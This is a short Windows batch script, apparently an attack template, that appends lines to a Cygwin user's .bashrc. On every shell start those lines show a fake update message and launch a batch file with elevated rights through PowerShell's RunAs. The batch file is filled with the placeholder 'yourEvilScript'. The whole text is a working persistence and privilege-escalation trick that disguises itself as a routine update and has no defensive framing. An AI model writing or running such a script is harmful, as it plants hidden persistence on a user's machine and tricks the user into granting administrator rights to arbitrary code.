cd ..\..\Cygwin64\home\%USERNAME%
echo echo "Cygwin must check for update!" >> .bashrc
echo /cygdrive/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command "Start-Process %USERPROFILE%\CygwinUpdate.bat -Verb RunAs" >> .bashrc
echo echo "Cygwin updated!" >> .bashrc
cd %USERPROFILE%
echo yourEvilScript > CygwinUpdate.bat
